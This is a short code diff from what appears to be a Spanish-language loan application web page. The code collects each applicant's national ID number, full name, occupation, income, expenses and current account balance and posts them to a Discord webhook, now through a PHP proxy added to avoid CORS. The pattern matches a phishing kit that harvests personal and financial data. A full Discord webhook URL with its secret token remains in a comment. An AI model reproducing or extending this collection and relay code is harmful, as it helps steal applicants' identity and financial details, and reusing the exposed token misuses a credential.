@@ -705,9 +705,10 @@
                 // ======================
                 const discordMessage = `🟣 INFO DE PRÉSTAMO 🟣\n\n🪪 Cédula: ${formData.cedula}\n👤 Nombre y apellido: ${formData.nombreCompleto}\n🧑‍💼 Ocupación: ${formData.ocupacion}\n📈 Ingresos mensuales: ${formData.ingresoMensual}\n💸 Gastos mensuales: ${formData.gastosMensual}\n💰 Saldo actual: ${formData.saldoActual}`;
 
-                const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1445512982183542946/oW2UNp7_duYwK0kkt-Bzcyub7SpPAur5fJrEkVLCwG79GgaXCeNxMkJOo2FeaU1W_xZn";
+                // Enviar a Discord usando el Proxy para evitar CORS
+                // const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1445512982183542946/oW2UNp7_duYwK0kkt-Bzcyub7SpPAur5fJrEkVLCwG79GgaXCeNxMkJOo2FeaU1W_xZn"; // Ahora manejado por el proxy
 
-                await fetch(DISCORD_WEBHOOK, {
+                await fetch("proxy_discord.php", {
                   method: "POST",
                   headers: {
                     "Content-Type": "application/json",
